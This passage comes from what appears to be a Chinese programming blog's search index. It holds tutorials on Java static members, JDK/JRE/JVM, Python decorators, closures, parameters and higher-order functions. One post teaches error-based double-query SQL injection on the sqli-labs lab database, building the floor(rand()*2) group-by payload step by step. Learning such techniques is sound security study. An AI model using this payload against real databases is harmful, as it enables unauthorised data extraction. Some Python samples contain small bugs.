实现类可以不必覆写default方法。default方法的目的是，当我们需要给接口新增一个方法时，会涉及到修改全部子类。如果新增的是default方法，那么子类就不必全部修改，只需要在需要覆写的地方去覆写新增方法。 静态字段和静态方法 静态字段 静态字段定义：static field 静态字段并不属于实例，所有实例共享一个静态字段，所以无论修改哪个实例的静态字段，效果都是一样的：所有实例的静态字段都被修改了。 在代码中，实例对象能访问静态字段只是因为编译器可以根据实例类型自动转换为类名.静态字段来访问静态对象。所以，推荐用类名来访问静态字段。 静态方法 调用实例方法必须通过一个实例变量，而调用静态方法则不需要实例变量，通过类名就可以调用。例如： 1234567891011121314public class Main &#123; public static void Main(String args[]) &#123; Person.setNumber(99); System.out.println(Person.number); &#125;&#125;class Person &#123; public static int number; public static void setNumber(int value) &#123; number = value; &#125;&#125; 静态方法属于类而不属于实例，因此，静态方法内部无法访问this变量，也无法访问实例字段，只能访问静态字段。 接口的静态字段 interface是一个纯抽象类，所以不能定义实例字段。但是interface可以有静态字段，并且静态字段必须为final类型。例如： 12345public interface Person &#123; public static final int MALE = 1; public static final int FEMALE = 2;&#125; 但是，interface的字段只能是public static final类型，所以我们可以把这些修饰符都去掉，编译器会自动加上。","tags":[{"name":"java","slug":"java","permalink":"http://ca0y1h.top/tags/java/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"java","slug":"编程/java","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"}]},{"title":"Java基础学习之JDK、JRE、JVM","date":"2019-09-23T13:14:39.000Z","path":"Java/code/1.Java基础学习之JDK、JRE、JVM/","text":"Java基础学习之JDK、JRE、JVM 最近帮一个师兄做Cisco的软件工程师面试题，发现还问到了JDK、JRE和JVM之间的关系，虽然看起来比较基础，但是对这个概念还是很模糊，没有形成一个有效的框架，借用廖雪峰师傅的一张图来说明，一图胜千言。 JDK：Java Develop Kit JRE：Java Runtime Environment 简单地说，JRE就是运行Java字节码的虚拟机。但是，如果只有Java源码，要编译成Java字节码，就需要JDK，因为JDK除了包含JRE，还提供了编译器、调试器等开发工具。 再贴一张Java执行代码过程的图： 这里再简单的说一下Java 为什么能跨平台，实现一次编写，多处运行？ Java 能够跨平台运行的核心在于 JVM 。不是 Java 能够跨平台，而是它的 jvm 能够跨平台。 Java 引入了字节码的概念，jvm 只能认识字节码，并将它们解释到系统的 API 调用。针对不同的系统有不同的 jvm 实现，有 Linux 版本的 jvm 实现，也有 Windows 版本的 jvm 实现，但是同一段代码在编译后的字节码是一样的。","tags":[{"name":"java","slug":"java","permalink":"http://ca0y1h.top/tags/java/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"java","slug":"编程/java","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"}]},{"title":"web安全学习之SQL注入——双查询报错注入及其原理","date":"2019-09-17T01:54:22.000Z","path":"Web_security/basic_learning/11.SQL注入——双查询注入/","text":"web安全学习之SQL注入——双查询报错注入及其原理 如果是SQL报错注入的话，经常会看到一个报错函数floor，虽然有现成的公式给你套用，但我还是觉得有必要弄清楚里面的原理。 payload形成 双注入payload需要用到四个函数和一个group by语句： group by：分组语句； rand()：随机生成函数； floor()：取整函数； concat()：字符串连接函数； count()：统计函数。 用sqli-labs中的数据库为示例： concat函数 1mysql&gt; SELECT concat(&quot;test：&quot;,(SELECT database()))as a; 执行查询操作时，子查询先开始，所以SELECT database()先执行，然后查询到当前数据库名称”security“，并将其传给concat函数，concat函数在对字符进行连接，于是显示出图上的结果。 rand函数 rand()函数，其作用是生成一个大于0小于1的随机浮点数，如下： floor函数 floor()函数的作用是对传入的参数取整，这里将rand()生成的随机数做处理进行取整，由于rand()生成的值取整结果只能为0，所以我们这里做一点处理，使其生成一个大于0小于2的随机值，并对其取整： 1mysql&gt; SELECT floor(rand()*2); 结果要么为0要么为1： 接下来结合子查询，显示出数据库信息： 1mysql&gt; SELECT concat((SELECT database()), floor(rand()*2)) from users; users表有多少条数据就会返回多少条信息： 在注入中，我们不知道库名表名，往往借助information_schema这个库进行猜解 其中information_schema.schemata中包含了mysql的所有库名，information_schema.tables中包含了所有的表名，information_schema.columns中包含了所有的列名。 group by语句 现在加上group by语句对返回的数据进行分组处理： 1SELECT concat((SELECT database()), floor(rand()*2))as a from information_schema.schemata group by a; count函数 这里增加一个聚合函数count，构造的语句如下： 1SELECT count(*),concat((SELECT database()), floor(rand()*2))as a from information_schema.schemata group by a; 当我们加上count(*)函数时，操作过程为：查看虚拟表是否存在该主键值，不存在则插入新记录，存在则count(*)字段直接加1。 这里利用count(*)对前面的返回数据进行统计，由于group by 和随机数的原因，有可能会出现重复的键值，当键值重复时就会触发错误，然后报错，由于子查询在错误发生之前就已经完成，所以子查询的内容会随着报错信息一起显示出来： payload原理 直接把这一篇文章搬运过来吧，写得非常好，在此就做个小的总结： 通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1,（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行和不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。 结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错","tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://ca0y1h.top/tags/sql%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Python函数式编程-装饰器","date":"2019-09-15T05:51:50.000Z","path":"Python/code/4.Python函数式编程-装饰器/","text":"Python函数式编程-装饰器 搬运自https://foofish.net/python-decorator.html 原文有若干处错误！ 引入 装饰器本质上是一个 Python 函数或类，它可以让其他函数或类在不需要做任何代码修改的前提下增加额外功能，装饰器的返回值也是一个函数/类对象。 它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景，装饰器是解决这类问题的绝佳设计。有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码到装饰器中并继续重用。 概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 接下来，我们一步一步的来看装饰器是怎么形成和起作用的。 先来看一个简单函数： 12def foo(): print(&#x27;I am foo&#x27;) 现在有一个新的需求，希望可以记录下函数的执行日志，于是在代码中添加日志代码： 123def foo(): print(&#x27;I am foo&#x27;) logging.info(&#x27;foo is running&#x27;) 假设现在其他函数也有类似的需求，如果再写一个logging在其他函数里面，这样就会造成大量重复代码。首先想到的解决办法肯定是重新定义一个函数专门来处理日志。 12345678def use_logging(func): logging.warn(&quot;%s is running&quot; % func.__name__) func() def foo(): print(&#x27;I am foo&#x27;) use_logging(foo) 这样做逻辑上是没问题的，功能是实现了，但是我们调用的时候不再是调用真正的业务逻辑foo函数，而是换成了use_logging函数。那么有没有更好的方式的呢？当然有，答案就是装饰器。 简单装饰器 123456789101112import loggingdef use_logging(func): def wrapper(): logging.warning(&quot;%s is running&quot; % func.__name__) return func() # 把foo当作参数传进来时，执行func()就相当于执行了foo() return wrapperdef foo(): print(&#x27;I am foo&#x27;)foo = use_logging(foo) # 因为装饰器 use_logging(foo) 返回的时函数对象 wrapper，这条语句相当于 foo = wrapperfoo() # 执行foo()就相当于执行 wrapper() use_logging 就是一个装饰器，它一个普通的函数，它把执行真正业务逻辑的函数 func 包裹在其中，看起来像 foo 被 use_logging 装饰了一样，use_logging 返回的也是一个函数，这个函数的名字叫 wrapper。 语法糖 @符号就是装饰器的语法糖，它放在函数开始定义的地方，这样就可以省略最后一步再次赋值的操作。 12345678910111213import loggingdef use_logging(func): def wrapper(): logging.warning(&quot;%s is running&quot; % func.__name__) return func() return wrapper@use_loggingdef foo(): print(&#x27;I am foo&#x27;)#foo = use_logging(foo)foo() 如上所示，有了 @ ，我们就可以省去foo = use_logging(foo)这一句了，直接调用 foo() 即可得到想要的结果。 带参数的foo() 如果业务逻辑函数 foo 需要参数，例如： 12def foo(name): print(&#x27;I am %s&#x27;, name) 我们可以在定义 wrapper 函数的时候指定参数： 123def wrapper(name): logging.warning(&quot;%s is running&quot; % func.__name__) return func(name) 这样 foo 函数定义的参数就可以定义在 wrapper 函数中。如果func函数需要若干个参数的话，可以用*args代替： 123def wrapper(*args): logging.warning(&quot;%s is running&quot; % func.__name__) return func(*args) 如果 foo 函数还定义了一些关键字参数呢？比如： 12def foo(name, age=None, height=None): print(&#x27;I am %s, age %s, height %s&#x27; % (name, age, height)) 这时，你就可以把 wrapper 函数指定关键字函数： 1234def wrapper(*args, **kw): # args是一个数组，kwargs一个字典 logging.warn(&quot;%s is running&quot; % func.__name__) return func(*args, **kw) 完整的函数定义和调用如下： 123456789101112import loggingdef use_logging(func): def wrapper(*args, **kw): logging.warn(&quot;%s is running&quot; % func.__name__) return func(*args, **kw) return wrapper@use_loggingdef foo(): print(&#x27;I am foo&#x27;)foo() 带参数的装饰器 装饰器的语法允许我们在调用时，提供其它参数，比如@decorator(a)。这样，就为装饰器的编写和使用提供了更大的灵活性。比如：我们可以在装饰器中指定日志的等级，因为不同业务函数可能需要的日志级别是不一样的。 12345678910111213141516171819import loggingdef use_logging(level): def decorator(func): def wrapper(*args, **kw): if level == &#x27;warn&#x27;: logging.warning(&quot;%s is running&quot; % func.__name__) elif level == &#x27;error&#x27;: logging.error(&quot;%s is running&quot; % func.__name__) return func(*args, **kw) return wrapper return decorator@use_logging(level=&#x27;error&#x27;)def foo(name, age): print(&#x27;I am %s, %s age&#x27; % (name, age))foo(&#x27;foo&#x27;, 19) 上面的use_logging是允许带参数的装饰器。它实际上是对原有装饰器的一个函数封装，并返回一个装饰器。我们可以将它理解为一个含有参数的闭包。 具体而言，和两层嵌套的decorator相比，3层嵌套的效果是这样的： 12&gt;&gt;&gt; foo = use_logging(&#x27;error&#x27;)(foo) 首先执行use_logging('error')返回的是decorator，再调用返回的函数，参数是foo，即decorator(foo)，返回的最终是wrapper函数。 @use_logging(level=&quot;warn&quot;)等价于@decorator functools.wraps 使用装饰器极大地复用了代码，但是他有一个缺点就是原函数的元信息不见了，比如函数的docstring、__name__、参数列表，先看例子： 123456789101112131415def log(text): def decorator(func): def wrapper(*args, **kw): print(&#x27;%s %s():&#x27; % (text, func.__name__)) return func(*args, **kw) return wrapper return decorator@log(&#x27;execute&#x27;)def now(): print(&#x27;2015-3-25&#x27;)now()print(now.__name__) 输出结果如下： 1234execute now():2015-3-25&#x27;wrapper&#x27; 因为返回的那个wrapper()函数名字就是'wrapper'，所以，需要把原始函数的__name__等属性复制到wrapper()函数中，否则，有些依赖函数签名的代码执行就会出错。 可以直接使用Python内置的functools.wraps函数解决上述问题。一个完整的decorator如下： 123456789import functoolsdef log(func): @functools.wraps(func) def wrapper(*args, **kw): print(&#x27;call %s():&#x27; % func.__name__) return func(*args, **kw) return wrapper 针对带参数的装饰器： 1234567891011import functoolsdef log(text): def decorator(func): @functools.wraps(func) def wrapper(*args, **kw): print(&#x27;%s %s():&#x27; % (text, func.__name__)) return func(*args, **kw) return wrapper return decorator","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://ca0y1h.top/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"编程/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Python函数式编程-闭包","date":"2019-09-15T03:40:39.000Z","path":"Python/code/3.Python函数式编程-闭包/","text":"Python函数式编程-闭包 搬运自https://serholiu.com/python-closures 首先给出闭包的一种浅显的定义（可能不够准确）：要形成闭包，首先得有一个嵌套的函数，即函数中定义了另一个函数，闭包则是一个集合，它包括了外部函数的局部变量，这些局部变量在外部函数返回后也继续存在，并能被内部函数引用。 举个例子 定义一个函数 generate_power_func，它返回另一个函数，现在闭包形成的条件已经达到。 123456def generate_power_func(n): print(&#x27;id(n): %X&#x27; % id(n)) def nth_power(x): return x**n print(&#x27;id(nth_power): %X&#x27; % id(nth_power)) return nth_power 对于内部函数 nth_power，它能引用到外部函数的局部变量 n，而且即使 generate_power_func 已经返回。把这种现象就称为闭包。具体使用一下。 12345&gt;&gt;&gt; raised_to_4 = generate_power_func(4)id(n): 7FF968E462F0id(nth_power): 1A5E3415510&gt;&gt;&gt; repr(raised_to_4)&#x27;&lt;function generate_power_func.&lt;locals&gt;.nth_power at 0x000001A5E3415510&gt;&#x27; 可以看出，当generate_power_func(4)执行后，创建并返回了nth_power这个函数对象，内存地址是1A5E3415510，并且发现raised_to_4和它的内存地址相同，**即raised_to_4**只是这个函数对象的一个引用。先在全局命名空间中删除 generate_power_func，再试试会出现什么结果。 123&gt;&gt;&gt; del generate_power_func&gt;&gt;&gt; raised_to_4(2)16 这就是闭包的作用，外部函数的局部变量可以被内部函数引用，即使外部函数已经返回了。 __closure__属性和cell对象 那么，闭包在Python内部到底是怎么实现的呢？Python 中函数也是对象，所以函数也有很多属性，和闭包相关的就是 __closure__ 属性。__closure__ 属性定义的是一个包含 cell 对象的元组，其中元组中的每一个 cell 对象用来保存作用域中变量的值。 12345678&gt;&gt;&gt; raised_to_4.__closure__(&lt;cell at 0x000001A5E320DDC8: int object at 0x00007FF968E462F0&gt;,)&gt;&gt;&gt; type(raised_to_4.__closure__)&lt;class &#x27;tuple&#x27;&gt;&gt;&gt;&gt; type(raised_to_4.__closure__[0])&lt;class &#x27;cell&#x27;&gt;&gt;&gt;&gt; raised_to_4.__closure__[0].cell_contents4 就如刚才所说，在 raised_to_4 的 __closure__ 属性中有外部函数变量 n 的引用，通过内存地址可以发现，引用的都是同一个 n。如果没用形成闭包，则 __closure__ 属性为 None。 Attention 一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了f()才执行。我们来看一个例子： 123456789def count(): fs = [] for i in range(1, 4): def f(): return i*i fs.append() return fsf1, f2, f3 = count() 在上面的例子中，每次循环，都创建了一个新的函数，然后，把创建的3个函数都返回了。你可能认为调用f1()，f2()和f3()结果应该是1，4，9，但实际结果是： 123456&gt;&gt;&gt; f1()9&gt;&gt;&gt; f2()9&gt;&gt;&gt; f3()9 全部都是9！原因就在于返回的函数引用了变量i，但它并非立刻执行。等到3个函数都返回时，它们所引用的变量i已经变成了3，因此最终结果为9。 返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。 如果一定要引用循环变量怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该循环变量后续如何更改，已绑定到函数参数的值不变： 123456789def count(): def f(j): def g(): return j*j return g fs = [] for i in range(1, 4): fs.append(f(i)) # f(i)立刻被执行，因此i的当前值被传入f() return fs","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://ca0y1h.top/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"编程/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Python函数的参数","date":"2019-09-14T04:28:57.000Z","path":"Python/code/1.Python函数的参数/","text":"Python函数的参数 关于Python的参数，在各种代码中看到最多的可能就是def func(*args, **kw)这种参数组合，这篇文章就来讨论我们是如何一步一步来得到这样的参数组合。 概述 Python的函数定义非常简单，但灵活度却非常大。除了正常定义的必选参数外，还可以使用默认参数、可变参数和关键字参数，使得函数定义出来的接口，不但能处理复杂的参数，还可以简化调用者的代码。 位置参数 位置参数是我们最常见的函数参数，例如下面完成幂运算的pow函数： 123456def pow(x, n): s = 1 while n &gt; 0: n = n - 1 s = s * x return s pow(x, n)函数有两个参数：x和n，这两个参数都是位置参数，调用函数时，传入的两个值按照位置顺序依次赋值给参数x和n。 默认参数 由于我们经常计算x^2，所以，完全可以把第二个参数n的默认值设定为2： 123456def pow(x, n=2): s = 1 while n &gt; 0: n = n - 1 s = s * x return s 这样，我们在调用pow(5)时，相当于调用pow(5, 2)： 1234&gt;&gt;&gt; power(5)25&gt;&gt;&gt; power(5, 2)25 设置默认参数时，有几点需要注意： 必选参数在前，默认参数在后，否则Python编译器会报错； 当函数有多个参数时，把变化大的参数放前面，变化小的参数放后面。变化小的参数就可以作为默认参数。 也可以不按顺序提供部分默认参数。当不按顺序提供部分默认参数时，需要把参数名写上。 默认参数有个最大的坑，如下： 12345678910&gt;&gt;&gt; def add_end(L=[]):... L.append(&#x27;END&#x27;)... return L... &gt;&gt;&gt; add_end()[&#x27;END&#x27;]&gt;&gt;&gt; add_end()[&#x27;END&#x27;, &#x27;END&#x27;]&gt;&gt;&gt; add_end()[&#x27;END&#x27;, &#x27;END&#x27;, &#x27;END&#x27;] 我们发现，每次使用默认参数调用add_end()函数时，都会“记住“上一次调用的结果。 原因如下： Python函数在定义的时候，默认参数L的值就被计算出来了，即[]，因为默认参数L也是一个变量，它指向对象[]，每次调用该函数，如果改变了L的内容，则下次调用时，默认参数的内容就变了，不再是函数定义时的[]了。 所以，默认参数必须指向不可变对象！！！ 上面的例子修改如下： 12345def add_end(L=None)： if L == None: L = [] L.append(&#x27;END&#x27;) return L 可变参数 以数学题为例子，给定一组数字a，b，c……，请计算a^2 + b^2 + c^2 + ……，由于参数不确定，首先想到可以把a，b，c…作为一个list或者tuple传进来。 12345def calc(numbers): sum = 0 for n in numbers: sum = sum + n * n return sum 在传参时就需要先组装一个tuple或list： 1234&gt;&gt;&gt; calc([1, 2, 3])14&gt;&gt;&gt; calc((1, 3, 5, 7))84 如果使用可变参数： 12345def calc(*numbers): sum = 0 for n in numbers: sum = sum + n * n return sum 在函数内部，参数numbers接收到的是一个tuple，因此，函数代码完全不变。但是，调用该函数时，可以传入任意个参数，包括0个参数： 12345&gt;&gt;&gt; calc(1, 2)5&gt;&gt;&gt; calc()0 如果已经有一个list或tuple，传参时可以使用*来对其进行解包操作： 1234&gt;&gt;&gt; nums = [1, 2, 3]&gt;&gt;&gt; calc(*nums)14 *nums表示把nums这个list的所有元素作为可变参数传进去。 关键字参数 关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict。例如： 123def person(name, age, **kw): print(&#x27;name:&#x27;, name, &#x27;age:&#x27;, age, &#x27;other:&#x27;, kw) 在调用该函数时，可以只传入必选参数： 123&gt;&gt;&gt; person(&#x27;Colin&#x27;, 24)name: Colin age: 24 other: &#123;&#125; 也可以传入任意个数的关键字参数： 12345&gt;&gt;&gt; person(&#x27;Bob&#x27;, 35, city=&#x27;Beijing&#x27;)name: Bob age: 35 other: &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;&#125;&gt;&gt;&gt; person(&#x27;Adam&#x27;, 45, gender=&#x27;M&#x27;, job=&#x27;Engineer&#x27;)name: Adam age: 45 other: &#123;&#x27;gender&#x27;: &#x27;M&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125; 关键字参数可以扩展函数功能，例如：正在做一个用户注册的功能，除了用户名和年龄是必填项外，其他都是可选项，利用关键字参数来定义这个函数就能满足注册的需求。 和可变参数类似，可以先组装出一个dict，再把该dict转换为关键字参数传进去： 1234&gt;&gt;&gt; extra = &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125;&gt;&gt;&gt; person(&#x27;Jack&#x27;, 24, city=extra[&#x27;city&#x27;], job=extra[&#x27;job&#x27;])name: Jack age: 24 other: &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125; 可以简化为： 123&gt;&gt;&gt; extra = &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125;&gt;&gt;&gt; person(&#x27;Jack&#x27;, 24, **extra) **extra表示把extra这个dict的所有key-value用关键字参数传入到函数的**kw参数，kw将获得一个dict，注意kw获得的dict是extra的一份拷贝，对kw的改动不会影响到函数外的extra。 命令关键字参数 对于关键字参数，函数的调用者可以传入任意不受限制的关键字参数。如果要限制关键字参数的名字，可以用命名关键字参数。例如只接收city和job作为关键字参数： 123def person(name, age, *, city, job): print(name, age, city, job) 和关键字参数**kw不同，命名关键字参数需要一个特殊分隔符*，*后面的参数被视为命名关键字参数。 调用方式如下： 123&gt;&gt;&gt; person(&#x27;Jack&#x27;, 24, city=&#x27;Beijing&#x27;, job=&#x27;Engineer&#x27;)Jack 24 Beijing Engineer 如果参数中已经有一个可变参数，后面跟着的命令关键字参数就不需要分隔符*： 123def person(name, age, *args, city, job): print(name, age, args, city, job) 命名关键字参数必须传入参数名，这和位置参数不同。 参数组合 参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。例如： 123456&gt;&gt;&gt; def f1(a, b ,c=0, *args, **kw):... print(&#x27;a =&#x27;, a, &#x27;b =&#x27;, b, &#x27;c =&#x27;, c, &#x27;args =&#x27;, args, &#x27;kw =&#x27;, kw)... &gt;&gt;&gt; def f2(a, b, c=0, *, d, **kw):... print(&#x27;a =&#x27;, a, &#x27;b =&#x27;, b, &#x27;c =&#x27;, c, &#x27;d =&#x27;, d, &#x27;kw =&#x27;, kw) 函数调用如下： 12345678910111213&gt;&gt;&gt; f1(1,2)a = 1 b = 2 c = 0 args = () kw = &#123;&#125;&gt;&gt;&gt; f1(1,2,c=3)a = 1 b = 2 c = 3 args = () kw = &#123;&#125;&gt;&gt;&gt; f1(1,2,3)a = 1 b = 2 c = 3 args = () kw = &#123;&#125;&gt;&gt;&gt; f1(1,2,3,&#x27;a&#x27;,&#x27;b&#x27;)a = 1 b = 2 c = 3 args = (&#x27;a&#x27;, &#x27;b&#x27;) kw = &#123;&#125;&gt;&gt;&gt; f1(1,2,3,&#x27;a&#x27;,&#x27;b&#x27;,x=99)a = 1 b = 2 c = 3 args = (&#x27;a&#x27;, &#x27;b&#x27;) kw = &#123;&#x27;x&#x27;: 99&#125;&gt;&gt;&gt; f2(1,2,d=99,ext=None)a = 1 b = 2 c = 0 d = 99 kw = &#123;&#x27;ext&#x27;: None&#125; 还可以用一个tuple和dict调用上述函数： 123456789&gt;&gt;&gt; args = (1,2,3,4)&gt;&gt;&gt; kw = &#123;&#x27;d&#x27;: 99, &#x27;x&#x27;: &#x27;#&#x27;&#125;&gt;&gt;&gt; f1(*args, **kw)a = 1 b = 2 c = 3 args = (4,) kw = &#123;&#x27;d&#x27;: 99, &#x27;x&#x27;: &#x27;#&#x27;&#125;&gt;&gt;&gt; args = (1, 2, 3)&gt;&gt;&gt; kw = &#123;&#x27;d&#x27;:88, &#x27;x&#x27;:&#x27;#&#x27;&#125;&gt;&gt;&gt; f2(*args, **kw)a = 1 b = 2 c = 3 d = 88 kw = &#123;&#x27;x&#x27;: &#x27;#&#x27;&#125; 总结 *args是可变参数，args接收一个tuple； **kw是关键字参数，kw接收一个dict； 可变参数既可以直接传入：func(1, 2, 3)，还可以组装成一个list或tuple传入：func(*(1, 2, 3))； 关键字参数既可以直接传入：func(a=1, b=2)，还可以组装成一个dict传入：func(**&#123;'a': 1, 'b': 2&#125;)； 命名关键字参数是为了限制调用者可以传入的参数名，同时可以提供默认值；","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"编程/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Python函数式编程之高阶函数","date":"2019-09-11T12:33:15.000Z","path":"Python/code/2.Python函数式编程之高阶函数/","text":"Python函数式编程之高阶函数 今天我们就来看几个Python的高级函数：Map，Reduce，Filter，Sorted。 Map Function Definition map()函数接收两个参数，一个是函数，一个是Iterable，map将传入的函数依次作用到序列的每个元素，并把结果作为新的Iterable返回。 Example 1234567891011&gt;&gt;&gt; def f(x):... return x*x... &gt;&gt;&gt; r = map(f, [1,2,3,4,5,6,7,8,9,10])&gt;&gt;&gt; r&lt;map object at 0x0000020AAF4C1668&gt;&gt;&gt;&gt; list(r)[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]&gt;&gt;&gt;&gt;&gt;&gt; list(map(str, [1,2,3,4,5,6,7,8,9,10]))[&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;10&#x27;] Reduce Function Definition reduce()函数和map()相似，接收两个参数，一个是函数，一个Iterable。不同的是，reduce()把一个函数作用在一个序列[x1, x2, x3, ...]上，并且这个函数必须接收两个参数，reduce()把结果继续和序列的下一个元素做累积计算，形如： 1reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4) Example 1234567891011121314&gt;&gt;&gt; from functools import reduce&gt;&gt;&gt; def fn(x, y):... return x*10 + y... &gt;&gt;&gt; reduce(fn, [1, 3, 5, 7, 9])13579# 配合map()，我们就可以写出把str转换为int的函数&gt;&gt;&gt; def char2nums(s):... digits = &#123;&#x27;0&#x27;: 0, &#x27;1&#x27;: 1, &#x27;2&#x27;: 2, &#x27;3&#x27;: 3, &#x27;4&#x27;: 4, &#x27;5&#x27;: 5, &#x27;6&#x27;: 6, &#x27;7&#x27;: 7, &#x27;8&#x27;: 8, &#x27;9&#x27;: 9&#125;... return digits[s]... &gt;&gt;&gt; reduce(fn, map(char2nums, &#x27;1234&#x27;))1234 使用lambda表达式可以进一步化简： 123456789from functools import reduceDIGITS = &#123;&#x27;0&#x27;: 0, &#x27;1&#x27;: 1, &#x27;2&#x27;: 2, &#x27;3&#x27;: 3, &#x27;4&#x27;: 4, &#x27;5&#x27;: 5, &#x27;6&#x27;: 6, &#x27;7&#x27;: 7, &#x27;8&#x27;: 8, &#x27;9&#x27;: 9&#125;def char2num(s): return DIGITS[s]def str2int(s): return reduce(lambda x, y: x * 10 + y, map(char2num, s)) Exercise 利用map和reduce编写一个str2float函数，把字符串'123.456'转换成浮点数123.456： 123456789101112def f(dig): dict = &#123;&#x27;0&#x27;:0, &#x27;1&#x27;:1, &#x27;2&#x27;:2, &#x27;3&#x27;:3, &#x27;4&#x27;:4, &#x27;5&#x27;:5, &#x27;6&#x27;:6, &#x27;7&#x27;:7, &#x27;8&#x27;:8, &#x27;9&#x27;:9&#125; return dict[dig]def g(x, y): return x*10+ydef h(a, b): return (a/10+b)def str2float(s): return reduce(g, map(f,s[:s.find(&#x27;.&#x27;)])) + reduce(h, map(f, s[-1:-(len(s)-s.find(&#x27;.&#x27;)):-1]))/10 Filter Function Definition 和map()类似，filter()也接收一个函数和一个序列。和map()不同的是，filter()把传入的函数依次作用于每个元素，然后根据返回值是True还是False决定保留还是丢弃该元素。filter()函数返回的是一个Iterator，也就是一个惰性序列。 Example 在一个list中，删掉偶数，只保留奇数： 1234def is_odd(n): return n % 2list(filter(is_odd, [1, 2, 3, 4, 5, 6, 7])) 把一个序列中的空字符串删掉： 1234def not_empty(s): return s and s.strip()list(filter(not_empty, [&#x27;A&#x27;, &#x27;&#x27;, &#x27;B&#x27;, None, &#x27;C&#x27;, &#x27; &#x27;])) Exercise 回数是指从左向右读和从右向左读都是一样的数，例如12321，909。请利用filter()筛选出回数： 1234def is_palindrome(n): return str(n)==str(n)[::-1]output = filter(is_palindrome, range(1, 1000)) Sorted Function Definition sorted()函数除了可以对list进行排序之外，它还可以接收一个key函数来实现自定义排序。 Example 12&gt;&gt;&gt; sorted([36, 5, -12, 9, -21])[-21, -12, 5, 9, 36] 12&gt;&gt;&gt; sorted([36, 5, -12, 9, -21], key=abs)[5, 9, -12, -21, 36]","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://ca0y1h.top/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"编程/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Leetcode_Primary-class","date":"2019-09-08T05:57:51.000Z","path":"Algorithm/1.Leetcode-Primary-class/","text":"Leetcode Primary Class #1 two-sum 两数之和 Question 给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。 你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。 Example 1234给定 nums &#x3D; [2, 7, 11, 15], target &#x3D; 9因为 nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9所以返回 [0, 1] Solution 方法一 123456789101112131415class Solution(object): def twoSum(self, nums, target): 